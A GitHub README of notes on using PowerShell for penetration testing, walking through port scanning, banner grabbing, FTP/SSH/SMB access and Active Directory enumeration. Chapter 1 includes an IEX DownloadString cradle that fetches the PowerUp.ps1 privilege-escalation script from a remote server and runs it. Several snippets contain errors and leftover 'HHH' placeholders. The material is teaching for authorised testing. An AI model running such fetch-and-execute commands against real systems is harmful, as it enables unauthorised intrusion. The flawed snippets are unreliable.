Utility'sfunctionality# PowerShell for Penetration Testing

Welcome to the [SnowCap Cyber](https://www.snowcapcyber.com) PowerShell for Penetration TestingGitHub repository. The goal of this repository is to provide you with a some notes that you may find useful when conducting a penetration test. Penetration begins with the ability to profile and map out a network, the systems and applications, and users associated with it.

## Chapter 1 - Introducing PowerShell

PowerShell is a scripting language that has been ported to a number of platforms such as  Microsoft Windows, Linux and Mac OS. Information and resources on how to use and program in PowerShell can be found at the following:

* [PowerShell Documentation](https://learn.microsoft.com/en-us/powershell/)

* [PowerShell on GitHub](https://github.com/PowerShell/PowerShell)

For the purposes of this document we are going to focus upon {PowerShell for Microsoft Windows and all of the example will be based upon PowerShell version 7. So let us begin with identifying the version of PowerShell that we are running. We can achieve this via examining the $PSVersionTable local variable.
```powershell
PS C:\> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      7.3.0
PSEdition                      Core
GitCommitId                    7.3.0
OS                             Microsoft Windows 10.0.19042
Platform                       Win32NT
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0…}
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
WSManStackVersion              3.0

PS C:>
```

Now that we know the version of PowerShell that is running on the target system, our next step is understand the execution policy that the target implements for PowerShell scripts. To achieve this we can execute the following.

```powershell
PS C:\Program Files\PowerShell\7> Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned

PS C:\Program Files\PowerShell\7>
```

As a scripting language PowerShall can be enabled or disabled on the local machine. To enable Powershell we can use the following command
```powershell
PS C:\> Set-ExecutionPolicy Unrestricted
```

Once we have created the ability to execute PowerShell scripts on the target system we need to identify the modules that are available to us to download and install.  To support software re-use PowerShell makes use of Modules. We can list all available modules using the find-module command are were can search for a Module containing a key word using the Tag option as follows.
```powershell
PS C:\> find-module -tag Azure

Version              Name                                Repository           Description
-------              ----                                ----------           -----------
2.10.3               Az.Accounts                         PSGallery            Microsoft Azure PowerShell - Accounts credential management cmdlets for Azure Resource Manager in Windows PowerShell and PowerShell Core.
5.8.4                AzureRM.profile                     PSGallery            Microsoft Azure PowerShell - Profile credential management cmdlets for Azure Resource Manager.
4.6.1                Azure.Storage                       PSGallery            Microsoft Azure PowerShell - Storage service cmdlets. Manages blobs, queues, tables and files in Microsoft Azure storage accounts
5.1.0                Az.Storage                          PSGallery            Microsoft Azure PowerShell - Storage service data plane and management cmdlets for Azure Resource Manager in Windows PowerShell and PowerShell Co…
4.9.0                Az.KeyVault                         PSGallery            Microsoft Azure PowerShell - Key Vault service cmdlets for Azure Resource Manager in Windows PowerShell and PowerShell Core.
5.1.1                Az.Compute                          PSGallery            Microsoft Azure PowerShell - Compute service cmdlets for Azure Resource Manager in Windows PowerShell and PowerShell Core.  Manages virtual machine
4.0.1                Az.ApiManagement                    PSGallery            Microsoft Azure PowerShell - Api Management service cmdlets for Azure Resource Manager in Windows PowerShell and PowerShell Core.
1.8.0                Az.Automation                       PSGallery            Microsoft Azure PowerShell - Automation service cmdlets for Azure Resource Manager in Windows PowerShell and PowerShell Core.
1.1.4                Az.AnalysisServices                 PSGallery            Microsoft Azure PowerShell - Analysis Services cmdlets for Windows PowerShell and PowerShell Core.
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .. . . . . . . . . . . . . . . . . . . . . . . .
```
Once we identified the module that we wish to install we can download and install it using the Install-Module command. So in the following we will download and install the SSH module.
```powershell
PS C:\> Install-Module -Name SSH

Untrusted repository
You are installing the modules from an untrusted repository. If you trust this repository, change its InstallationPolicy value by running the Set-PSRepository cmdlet. Are you sure you want to install the modules from
'PSGallery'?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): Y
PS C:\>
```

We can also import a PowerShell module directly as follows. In the following we will import the functions/cmdlets from the module PowerSploit.psd1. To install a PowerShelll module you must run the command in an PowerShell with administrator/root level privileges.
```powershell
PS C:\> Import-Module .\PowerSploit.psd1
```

Once we can imported a module we can examine the functions/cmdlets that it supports via the Get-Command cmdlet. In the following we will use the Get-Command cmdlet to identify the functions supported by the module SSH.

```powershell
PS C:\> Get-Command -module SSH

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-SSHCommand                                  1.0.0      SSH

PS C:\>
```

We can identify how to use PowerShell module via using the get-help command. In the following we will identify how to use the Get-Location cmdlet/function.
```powershell
PS C:\>get-help Get-Location

NAME
    Get-Location

SYNTAX
    Get-Location [-PSProvider <string[]>] [-PSDrive <string[]>] [<CommonParameters>]

    Get-Location [-Stack] [-StackName <string[]>] [<CommonParameters>]
```

Once you have a PowerShell shell then you can use the following to download files over the Network. In the following we will download the file PowerUp.ps1 from the web server www.snowcapcyber.co.uk to the local machine.

```powershell
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://www.snowcapcyber.co.uk/PowerUp.ps1')
```

PowerDhell also supports a set of functions that allow us to explore and manipulate a file system



Now that we have the ability to use PowerShell and find/install modules we can begin to use it to perform a penetration test.

## Chapter 2 - Network Mapping

We can use PowerShell to perform ICMP pings and traceroute. To perform an ICMP ping we simply make use of the PowerShell command as follows. The Test Connection cmdlet sends Internet Control Message Protocol (ICMP) Echo request packets to one or more comma-separated remote hosts and returns the Echo responses. When using Test-Connection we can use and DNS name or an IP address as shown below.
```powershell
PS C:\> Test-Connection www.google.com

Source        Destination     IPV4Address      IPV6Address                              Bytes    Time(ms)
------        -----------     -----------      -----------                              -----    --------
DESKTOP-01    www.google.com  142.250.200.4                                             32       14
DESKTOP-01    www.google.com  142.250.200.4                                             32       12
DESKTOP-01    www.google.com  142.250.200.4                                             32       15
DESKTOP-01    www.google.com  142.250.200.4                                             32       14

PS C:\> Test-Connection 142.250.200.4

Source        Destination     IPV4Address      IPV6Address                              Bytes    Time(ms)
------        -----------     -----------      -----------                              -----    --------
DESKTOP-01    142.250.200.4   142.250.200.4                                             32       18
DESKTOP-01    142.250.200.4   142.250.200.4                                             32       12
DESKTOP-01    142.250.200.4   142.250.200.4                                             32       22
DESKTOP-01    142.250.200.4   142.250.200.4                                             32       13

PS C:\>
```
If a machine can not be reached via ICMP ping then Test-Connection will return an error message. We can also use the Test-Connection command to map out a network. To do this we make use of its TraceRoute functionality
```powershell
PS C:\> Test-NetConnection 1.1.1.1 -TraceRoute

ComputerName           : 1.1.1.1
RemoteAddress          : 1.1.1.1
InterfaceAlias         : WLAN
SourceAddress          : 192.168.1.3
PingSucceeded          : True
PingReplyDetails (RTT) : 5 ms
TraceRoute             : 192.168.1.1
                         85.7.42.1
                         193.134.95.170
                         138.187.131.211
                         138.187.129.97
                         1.1.1.1
```

## Chapter 3 - Port Scanning Tool

The trick when creating and using tools for Penetration Testing is not to reinvent the year. There are a number of port scanning tools for TCP and UDP that we can access via GitHub.

* [PowerShell IPv4 Port Scanner](https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner)

* [TCP Port Scanner](https://gist.github.com/raandree/60a6677d0a97ea992a8a0b37681d6365)

* [TCP/UDP Port Scanner](https://github.com/calebstewart/Net-Scan)

* [Posh SecMod](https://github.com/darkoperator/Posh-SecMod)

* [The NetCmdlets Module](https://cdn.nsoftware.com/help/NCF/cmd/default.htm)

* [PowerCat](https://github.com/secabstraction/PowerCat)

It should be noted that many of the tools listed above will be detected, and classified as malicious software, by many anti-virus products. However, from a tools and techniques perspective they are useful and add value to out tool set. A Penetration Test begins with us profiling what is on a network. To achieve this we use a technique called an ARP scan. To achieve this we can make use of Get-NetNeighbor cmdlet.
```powershell
PS C:\> Get-NetNeighbor -AddressFamily IPv4

ifIndex IPAddress                                          LinkLayerAddress      State       PolicyStore
------- ---------                                          ----------------      -----       -----------
13      192.168.2.254                                      00:67:32:90:A1:6F     Permanent   ActiveStore
13      192.168.1.61                                       05:67:87:AF:89:C1     Permanent   ActiveStore
13      192.168.2.11                                       00:AF:81:C0:41:21     Stale       ActiveStore
```

We can also make use of the Invoke-ARPScan cmdlet from the Posh-SecMod module.
```powershell
PS C:\> Import-Module .\Posh-SecMod.psd1
PS C:\> Invoke-ARPScan -CIDR 192.168.2.0/24

MAC                            Address
---                            -------
00:AF:81:C0:41:21              192.168.1.11
05:67:87:AF:89:C1              192.168.1.61
00:67:32:90:A1:6F              192.168.1.254
```

We can use some of these tools to perform a quick TCP port scan of the target machine. The [IPv4PortScan](https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner) tool allows is to specify and start and end port number for our scan.

```powershell
PS C:\> IPv4PortScan.ps1 -Computername 172.16,24.145 -StartPort 1 -EndPort 1024

Port               : 53
Protocol           : tcp
ServiceName        : domain
ServiceDescription : Domain Name Server
Status             : Open

Port               : 631
Protocol           : tcp
ServiceName        : ipp
ServiceDescription : IPP (Internet Printing Protocol)
Status             : Open

PS C:\>
```

We can also use the [Start-PortScan](https://gist.github.com/raandree/60a6677d0a97ea992a8a0b37681d6365) tool as a TCP port scanner. This tool allows us to specify a start TCP port and a stop TCP port.
```powershell
PS C:\> Start-PortScan.ps1 -ComputerName f1dc2 -StartPort 1 -EndPort 1000
    ComputerName IP V4 Address Port Protocol Open ServiceName    ServiceDescription                    
    ------------ ------------- ---- -------- ---- -----------    ------------------                    
    f1dc2        192.168.13.4  53   TCP      True domain         Domain Name Server                    
    f1dc2        192.168.13.4  88   TCP      True kerberos       Kerberos                              
    f1dc2        192.168.13.4  90   TCP      True dnsix          DNSIX Securit Attribute Token Map     
    f1dc2        192.168.13.4  135  TCP      True epmap          DCE endpoint resolution               
    f1dc2        192.168.13.4  139  TCP      True netbios-ssn    NETBIOS Session Service               
    f1dc2        192.168.13.4  389  TCP      True ldap           Lightweight Directory Access Protocol
    f1dc2        192.168.13.4  445  TCP      True microsoft-ds   Microsoft-DS                          
    f1dc2        192.168.13.4  464  TCP      True kpasswd        kpasswd                               
    f1dc2        192.168.13.4  593  TCP      True http-rpc-epmap HTTP RPC Ep Map                       
    f1dc2        192.168.13.4  636  TCP      True ldaps          ldap protocol over TLS/SSL (was sldap)
```

We can use the [Net-Scan](https://github.com/calebstewart/Net-Scan) tool to can both TCP and UDP ports as shown. This tool allows is to list the TCP/UDP ports that are to scanned.
```powershell
PS C:\>.\Net-Scan.ps1 -ip 192.168.13.1 -mask 255.255.255.0 -tcp 88,443,1434 -udp 53
```

We can also use the Test-Connection PowerShell command to perform a test on a single port as follows:
```powershell
PS C:\> Test-Connection -TargetName 192.168.2.11 -TcpPort 443
```
Because we can use Test-Connection to test that a TCP port is open, when we can write a simple scripted to test every port in a list. It is important to note that this technique is not fast compares with tools such as NMAP.
```powershell
$ipaddress = 192.168.2.11
for ($counter=1; $counter -le 65535 ; $counter++)
{
  Test-Connection -TargetName 192.168.2.11 -TcpPort $counter
}
```

Rather than port scan one IP address at a time write a PowerShell application that will read DNS name and IP addresses from a file and and then scan a set of TCP ports from a file.

```powershell
$HOSTFILE = Get-Content "C:\HOSTS.txt"
$PORTFILE = Get-Content "C:\PORTS.txt"
foreach ($HOSTLINE in $HOSTFILE)
  {
    foreach ($PORTLINE in $PORTFILE)
    {
      $STATUS=(New-Object System.Net.Sockets.TcpClient).ConnectAsync($HOSTLINE, $PORTLINE).Wait(1000)
      Write-Output "$HOSTLINE, $PORTLINE, Status: $STATUS"
    }
}
```

We can use the [PowerCat PowerShell](https://github.com/secabstraction/PowerCat) application to perform port scanning. [PowerCat](https://github.com/secabstraction/PowerCat) gives is the ability to perform simple TCP port scanning. In the following we are going to scan all TCP ports in the range 1.1024 on the machine server01.snowcaocyber.co.uk


```powershell
PS C:\> 1..1024 | ForEach-Object { Connect-PowerCat -RemoteIp server01.snowcaocyber.co.uk -Port $_ -Timeout 1 -Verbose -Disconnect }
```

We can also perform UDP port scanning via the application NetCmdlets Module. First we need to install the NetCmdlets module.

```powershell
PS C:\> Install-Module -Name NetCmdlets
```

The Send-UDP cmdlet will bind to a specific local host address and send UDP datagrams to a remote Server. In the following we will send dome data to UDP port 4444 on the server udpserver.snowcapcyber.co.uk.

```powershell
PS C:\> send-udp -server udpserver.snowcapcyber.co.uk -port 4444 -data "test from netcmdlets"
```

We cab also use the [PowerCat](https://github.com/secabstraction/PowerCat) tool to perform UDP port scanning. In the following we are going to perform a UDP port scan against the target system server01.snowcapcyber.co.uk for all ports in the range 1..1024.


```powershell
PS C:\> 1..1024 | ForEach-Object { Connect-PowerCat -Mode Udp -RemoteIp server01.snowcapcyber.co.uk -Port $_ -Timeout 1 -Verbose }
```    

## Chapter 4 - Banner Grabbing and OS Fingerprinting
Once we have mapped out the structure and topology of a network the next stage in the Penetration Testing process is to capture version information about the services running and a target host operating system. To identify the operating of the local computer system we will use a WMI object as follows:
```powershell
PS C:\> (Get-WmiObject Win32_OperatingSystem).Caption
Microsoft Windows 10
```

We can easily get the OS version details of a remote computer by adding the parameter -ComputerName to Get-WmiObject
```powershell
PS C:\> (Get-WmiObject Win32_OperatingSystem -ComputerName dc-01.snowcapcyber.co.uk).Caption
Microsoft Windows Server 2012 Standard
```

When using the Get-WmiObject object to connect to a target system we may receive the error message “Get-WmiObject : Access is denied“. This error message is telling us that we need to make use of a set admin user credentials to access the resource. In the following PowerShell we make use of the Get-Credential object to create a set of credentials and then pass them to the Get-WmiObject object.

```powershell
PS C:\> $PSCredential = Get-Credential "dc-02.nowcapcyber.co.uk\administrator"
PS C:\> Get-WmiObject Win32_OperatingSystem -ComputerName dc-02.snowcapcyber.co.uk -Credential $PSCredential
Microsoft Windows Server 2016 Standard
```

The goal of the following [Banner Grabbing](https://github.com/snowcapcyber/PowerShell-for-Penetration-Testing/tree/main/PowerBanner)PowerShell tool is to connect to a TCP port on a target machine and then to read the data from the port.

```powershell
PS C:\> ./PowerBanner.ps1 -ComputerName ftp.snowcapcyber.co.uk -Port 21
220-Welcome To NEP Finland FTP service!
220 Service ready for new user
```

With some TCP servers we may wish to interact directly. So the following [Telnet Utility](https://github.com/snowcapcyber/PowerShell-for-Penetration-Testing/tree/main/PowerTelnet) allow is to specify and what machines we wish to talk to and on what ports. The functionality of the following PowerShell is akin to that of the Telnet utility.

```powershell
PS C:\> ./PowerTelnet.ps1 -ComputerName www.snowcapcyber.co.uk -Port 80
Creating a connection to: www.snowcapcyber.co.uk  on TCP port:  80
prompt>
```

So in the above we are going to connect an HTTP/WWW server and then send commands and receive/display the results.

## Chapter 5 - File Transfer Protocol (FTP)

When performing a penetration test on a FTP server there are three basic functions that we need to perform. We need to be able to list the contents of directory on an FTP server as well as Upload and download files to the FTRp server. There are a number of tools that allow for us to access FTP.

We can use the following PowerShell to list the contents of a directory on an FTP server. In the following we connect to an FTP server and execute the ListDirectoryDetails function to get a list of files. Once we have a list of files we the read them one at a time and write them out.
```powershell
$server = "ftp.snowcapcyber.co.uk"
$port = "21"
$username = "ajcblyth
$password = "MyPa55w0rdOK"

$ftp = [System.Net.FtpWebRequest]::create("ftp://$server/")
$ftp.Credentials =  New-Object System.Net.NetworkCredential($username,$password)
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
$response = $ftp.GetResponse()
$responseStream = $response.GetResponseStream()
$readStream = New-Object System.IO.StreamReader $responseStream
$files = New-Object System.Collections.ArrayList
while ($file = $readStream.ReadLine()) {
  Write-Output $file
}
```

We can then use FTP to upload files from a FTP Server. In the following we shall use PowerShell to upload  the file archive.zip
```powershell
client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("ajcblyth", "MyPa55w0rdOK")
$client.UploadFile("ftp://ftp.snowcapcyber.co.uk/path/archive.zip", "C:\archive.zip")
```

Finally we can use FTP to download files from a FTP Server. In the following we shall use PowerShell to download the file archive.zip
```powershell
$source = "ftp://ftp.snowcaocyber.co.uk/archive.zip"
$target = "c:\temp\archivezip"
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("ajcblyth", "MyPa55w0rdOK")
$client.DownloadFile($source, $target)
```

There are a number of modules that support access to FTP. To use these modules we must first install then. In following  we will make uses of the NetCmdlets PowerShell module to access a FTP Server.

* [The NetCmdlets Module](https://cdn.nsoftware.com/help/NCF/cmd/default.htm)


In the following we are going to install the NetCmdlets module. Remember that to install a module in PowerShell you need to be the administrator.
```powershell
PS C:\> Install-Module -Name NetCmdlets
```

One we have install the NetCmdlets module, then we can make use of its functionality. In the following we will use the Get-FTP function yo get a list of all file and directors in the root directory of the FTP server.

```powershell
PS C:\> $creds = New-Object System.Net.NetworkCredential("ajcblyth", "MyPa55w0rdOK")
PS C:\> Get-FTP -Server ftp.snowcapcyber.co.uk -Cred $creds -List *
```

Once we have a list of files on the FTP server then we can download a file to the local machine. We can do this using the HHH function as follows:
```powershell
PS C:\> $creds = New-Object System.Net.NetworkCredential("ajcblyth", "MyPa55w0rdOK")
PS C:\> Get-FTP -Server ftp.snowcapcyber.co.uk -Cred $creds -RemoteFile Pub/*
```

In the above we are going to download all files in the directory Pub on the Ftp Server. In the following we will use the User and Password flags to authenticate and download all files in the directory Pub on the Ftp Server.
```powershell
PS C:\> Get-FTP -Server ftp.snowcapcyber.co.uk -User ajcblyth -Password MyPa55w0rdOK -RemoteFile Pub/*
```

Once we have download a file then we can attempt to upload the file. The success of This function is dependant on the file permission located on the FTP server. To successfully upload a file we must have write permissions to the directory where the file is to be written. In the following we will upload the file archive.zip.
```powershell
PS C:\> Get-FTP -Server ftp.snowcapcyber.co.uk -User ajcblyth -Password MyPa55w0rdOK -RemoteFile Pub/archive.zip -LocalFile C:\>/temp/archive.zip
```

## Chapter 6 - Secure Shell (SSH), Secure FTP (SFTP) and Secure Copy (SCP)

The Secure Shell (SSH) allows us to engage in a secure interactive command line session with a client.  It achieves this via the implementation of a set of encryption algorithms. Secure FTP (SFTP) and Secure Copy (SCP) make use of SSH to facilitate Secure FTP and a Secure Copy functions between a client and a server. For SFTP and SCP to function the server much be running Secure Shell (SSH). In this section we will make uses of the NetCmdlets PowerShell module to access a SSH Server.

* [The NetCmdlets Module](https://cdn.nsoftware.com/help/NCF/cmd/default.htm)

First we need to install the NetCmdlets module.

```powershell
PS C:\> Install-Module -Name NetCmdlets
```

In the following we will use the Invoke-SSH function to execute a command line command on the client. It should be noted that the Invoke-SSH function will allow us to select the encryption algorithms to be used when communicating between the client and the server.

```powershell
PS C:\> Invoke-SSH -Server ssh.snowcapcyber.co.uk -User ajcblyth -Password MyPa55w0rdOK -Command 'ls -lisa'
```

We can use the Get-SCP command to copy a file from the server to the client. In the following command we are copying the file archive.zip from the server to the client.
```powershell
PS C:\>Get-SCP -Server ssh.snowcapcyber.co.uk -User ajcblyth -Password MyPa55w0rdOK -RemoteFile Pub/archive.zip
```

In the following we are going to use the Get-SFTP command to download the remote file archive.zip from the ssh server. Will authenticate to the ssh server using the -User and -Password flags.

```powershell
PS C:\> Get-SFTP -Server ssh.snowcapcyber.co.uk -User ajcblyth -Password MyPa55w0rdOK -RemotefFle Pub/archive.zip
```

The commands Get-SSH, Get-SCP and Get-SFTP all support the use of the NetworkCredential object for authentication. In the following we will use the NetworkCredential object and the -Cred flags to authenticate to the SSH server and download the file archive.zip.

```powershell
PS C:\> $creds = New-Object System.Net.NetworkCredential("ajcblyth", "MyPa55w0rdOK")
PS C:\> Get-SFTP -Server ssh.snowcapcyber.co.u -Cred $cred -RemotefFle Pub/archive.zip
```

By default the commands, Get-SSH, Get-SCP and Get-SFTP use the default TCP port of 22. But we can specify the TCP port to be used by the server using the Port flag. In the following we will connect to the ssh server ssh.snowcapcyber.co.uk on TCP port 2222 and execute the command 'cat /etc/passwd'.

```powershell
PS C:\> Invoke-SSH -Server ssh.snowcapcyber.co.uk -User ajcblyth -Password MyPa55w0rdOK -Port 2222 -Command 'cat /etc/passwd'
```

## Chapter 7 - The Web (WWW)

We can use the Invoke-WebRequest command to get the version information associated with a Web Server.
```powershell
$url = 'https://www.snowcapcyber.com'
$result = Invoke-WebRequest -Method GET -Uri $url -UseBasicParsing
$result.RawContent
```

The above PowerShell defines a URL and then uses the Invoke-WebRequest command to execute the GET HTTP verb on the Server. It should be noted that this command will allow us to execute a other HTTP verbs.
```powershell
PS C:\> Invoke-WebRequest http://www.snowcapcyber.co.uk
HTTP/1.1 200 OK
Link: <https://www.snowcapcyber.com/wp-json/>; rel="https://api.org/", <https://www.snowcapcyber.com/wp-json/wp/v2/pages/11822>; rel="alternate"; type="application/json", <https://www.snowcapcyber.com/>; rel=shortlink, <https://www.snowcapcyber.com/wp-json/>; rel="https://api.org/", <https://www.snowcapcyber.com/wp-json/wp/v2/pages/11822>; rel="alternate"; type="application/json", <https://www.snowcapcyber.com/>; rel=shortlink
Pragma: public
Strict-Transport-Security: max-age=63072000; includeSubdomains;
Upgrade: h2
Connection: Upgrade
Access-Control-Allow-Origin: *
Cache-Control: max-age=0, public
Content-Type: text/html; charset=UTF-8
Date: Sat, 20 Feb 2021 16:08:24 GMT
Expires: Sat, 20 Feb 2021 14:06:05 GMT
ETag: "b952b112b53c6a67782fff33f7ab4e37"
Last-Modified: Sat, 20 Feb 2021 13:06:05 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Powered-By: W3 Total Cache/2.1.0258=
```

Analysis of the above allows us to identify the server type and version number. This can then be used to identify potential vulnerabilities. Once we have identified the ports that are open we can make use of a REST API to identify the IP Address of a target machine. To achieve this we make use of the following
```powershell
PS C:\> Invoke-RestMethod -Uri https://snowcapcyber.com
ip       : 18.193.36.153
hostname : d1-hitch-eu-nlb-e064e2845fd0c838.elb.eu-central-1.amazonaws.com
city     : Droitwich
region   : Droitwich
country  : UK
loc      : 52.2616° N, 2.1526° W
org      : Amazon Technologies Inc. (AT-88-Z)
postal   : WR9 9AY
timezone : Europe/London
readme   : https://snowcapcyber.com

```

The HHH module is designed to probe a web site and return the status information returned by a HTTP request. In the following we are going to import the module and then query the web site www.snowcapcyber.co.uk.

```powershell
PS C:\> Install-Module -Name SocketHttpRequest
PS C:\> Invoke-SocketHttpRequest -IP 192.168.2.101 -Port 80 -HttpRequest "GET / HTTP/1.0`r`nHOST: www.snowcapcyber.co.uk`r`n`r`n"
```

## Chapter 8 - Windows File Sharing (SMB)

Windows makes use of Server Message Block (SMB) to allow for files to be shared over a network. Using PowerShell we can query the local machine to see what SMB shares it is making use of. To do this we must have the correct permissions otherwise the Get-SmbConnection cmdlet will return an error and say that access has been denied.
```powershell
PS C:\> Get-SmbConnection
ServerName          ShareName           UserName             Credential           Dialect             NumOpens
----------          ---------           --------             ----------           -------             --------
DC-01               DATA                SNOWCAPCYBER\And.... SNOWCAPCYBER.CO..... 3.00                0
DC-01               IPC$                SNOWCAPCYBER\And.... SNOWCAPCYBER.CO..... 3.00                0
```

The Get-SmbConnection cmdlet not only allows us to query a local machine it also allows us to query a remote machine via the -ServerName. Via using the HHH cmdlet we can start to identify the SMC shares that are being used within a target domain.
```powershell
PS C:\> Get-SmbConnection -ServerName DC-01.SNOWCAPCYBER.CO.UK
ServerName          ShareName           UserName             Credential           Dialect             NumOpens
----------          ---------           --------             ----------           -------             --------
DC-01.SNOWCAPCYB....DATA                SNOWCAPCYBER\DC-01$  SNOWCAPCYBER\DC-01$  3.00                0
```

W can also query the local host to identify what shares the local host is exporting to the network. The Get-SmbShare cmdlet retrieves objects that represent the Server Message Block (SMB) shares being displayed by the computer.
```powershell
PS C:\> Get-SMBShare
Name                          ScopeName                     Path                          Description
----                          ---------                     ----                          -----------
ADMIN$                        *                             C:\Windows                    Remote Admin
C$                            *                             C:\                           Default share
D$                            *                             D:\                           Default share   
```

We can also use HHH t query the local host and see if it has share has been mounted by a specific server server.
```powershell
PS C:\> Get-SmbShare -ScopeName "App-Dev01"
Name                          ScopeName                     Path                          Description
----                          ---------                     ----                          -----------
D$                            App-Dev0                      D:\                           Default Share
```

We can user PowerShell to create a mapped SMB drive. The following creates a temporary PowerShell drive that's mapped to a network share.

```powershell
PS C:\> New-PSDrive -Name "Public" -PSProvider "FileSystem" -Root "\\server01.snowcapcyber.co.uk\Public"

Name       Provider      Root
----       --------      ----
Public     FileSystem    \\server01.snowcapcyber.co.uk\Public
```

New-PSDrive uses the Name parameter to specify PowerShell drive named Public and the PSProvider parameter to specify the PowerShell FileSystem provider. The Root parameter specifies the network share's UNC path. We can also HHH to create a persistent network drive. The following maps a network drive that's authenticated with a domain service account's credentials. For more information about the PSCredential object that stores credentials and how passwords are stored as a SecureString, see the Credential parameter's description.
```powershell
PS C:\> $cred = Get-Credential -Credential SnowCapCyber\
NPS C:\> New-PSDrive -Name "X" -Root "\\server01.snowcapcyber.co.uk\Public" -Persist -PSProvider "FileSystem" -Credential $cred
Net Use

Status       Local     Remote                    Network
---------------------------------------------------------
OK           X:        \\Server01\Scripts        Microsoft Windows Network
```

## Chapter 9 - Active Directory (AD)

PowerShell comes with a series of tools that support access-to, and manipulation-of, Active Directory. We can start by profiling the local machine and identifying Active Directory Information.

```powershell
PS C:\> GSystem.DirectoryServices.ActiveDirectory.Domain]::getcomputerdomain()

Forest                  : snowcapcyber.co.uk
DomainControllers       : {DC-01.snowcapcyber.co.uk}
Children                : {}
DomainMode              : Windows8Domain
DomainModeLevel         : 5
Parent                  :
PdcRoleOwner            : DC-01.snowcapcyber.co.uk
RidRoleOwner            : DC-01.snowcapcyber.co.uk
InfrastructureRoleOwner : DC-01.snowcapcyber.co.uk
Name                    : snowcapcyber.co.uk
```

We can also execute the command on a remote machine provided that we have a correct set of credentials.
```powershell
PS C:\> $creds = New-Object System.Net.NetworkCredential("ajcblyth", "MyPa55w0rdOK")
PS C:\> Invoke-Command -ComputerName 'dc01.snowcapcyber.com' -Credential $cred-ScriptBlock {Get-SmbShare}
```

To query a domain about the users and computers located with a domain we can make use of the following. In the following we are doing to query the computer DC-01.snowcapcyber.co.uk and ask it to display information about the user 'Andrew Blyth'.

```powershell
PS C:\> get-aduser 'Andrew Blyth' -Server DC-01.snowcapcyber.co.uk

DistinguishedName : CN=Andrew Blyth,CN=Users,DC=snowcapcyber,DC=co,DC=uk
Enabled           : True
GivenName         : Andrew
Name              : Andrew Blyth
ObjectClass       : user
ObjectGUID        : 514e3604-66cc-4863-9c8b-8bcb26de9dd9
SamAccountName    : Andrew Blyth
SID               : S-1-5-21-345604638-380621598-4273189824-1001
Surname           : Blyth
UserPrincipalName : ajcblyth@snowcapcyber.co.uk
```

Once we have identified we user we can then Identify  the groups within a domain using the 'Get-ADGroup' command.

```powershell
PS C:\> get-adgroup -filter  *

DistinguishedName : CN=Administrators,CN=Builtin,DC=snowcapcyber,DC=co,DC=uk
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Administrators
ObjectClass       : group
ObjectGUID        : d3f7a3a8-e1f6-4477-901b-2a05264194b1
SamAccountName    : Administrators
SID               : S-1-5-32-544

DistinguishedName : CN=Users,CN=Builtin,DC=snowcapcyber,DC=co,DC=uk
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Users
ObjectClass       : group
ObjectGUID        : ca30f7eb-1f3d-4351-a3d4-ee94c2e9c5fe
SamAccountName    : Users
SID               : S-1-5-32-545
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
```

We can get information about the domain that a computer is located in via the following:

```powershell
PS C:\> get-addomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=snowcapcyber,DC=co,DC=uk
DeletedObjectsContainer            : CN=Deleted Objects,DC=snowcapcyber,DC=co,DC=uk
DistinguishedName                  : DC=snowcapcyber,DC=co,DC=uk
DNSRoot                            : snowcapcyber.co.uk
DomainControllersContainer         : OU=Domain Controllers,DC=snowcapcyber,DC=co,DC=uk
DomainMode                         : Windows2012Domain
DomainSID                          : S-1-5-21-345604638-380621598-4273189824
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=snowcapcyber,DC=co,DC=uk
Forest                             : snowcapcyber.co.uk
InfrastructureMaster               : DC-01.snowcapcyber.co.uk
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=snowcapcyber,D
                                     C=co,DC=uk}
LostAndFoundContainer              : CN=LostAndFound,DC=snowcapcyber,DC=co,DC=uk
ManagedBy                          :
Name                               : snowcapcyber
NetBIOSName                        : SNOWCAPCYBER
ObjectClass                        : domainDNS
ObjectGUID                         : 7dbff675-d36c-49a6-9b86-bc2ac2734361
ParentDomain                       :
PDCEmulator                        : DC-01.snowcapcyber.co.uk
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=snowcapcyber,DC=co,DC=uk
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {DC-01.snowcapcyber.co.uk}
RIDMaster                          : DC-01.snowcapcyber.co.uk
SubordinateReferences              : {DC=ForestDnsZones,DC=snowcapcyber,DC=co,DC=uk,
                                     DC=DomainDnsZones,DC=snowcapcyber,DC=co,DC=uk,
                                     CN=Configuration,DC=snowcapcyber,DC=co,DC=uk}
SystemsContainer                   : CN=System,DC=snowcapcyber,DC=co,DC=uk
UsersContainer                     : CN=Users,DC=snowcapcyber,DC=co,DC=uk
```

For a specific domain we try and discover the domain Controllers. In the following example we are targeting the domain 'snowcapcyber.co.uk'
.
```powershell
PS C:\> get-addomaincontroller -Discover -DomainName snowcapcyber.co.uk

Domain      : snowcapcyber.co.uk
Forest      : snowcapcyber.co.uk
HostName    : {DC-01.snowcapcyber.co.uk}
IPv4Address : 192.168.2.11
IPv6Address :
Name        : DC-01
Site        : Default-First-Site-Name
```

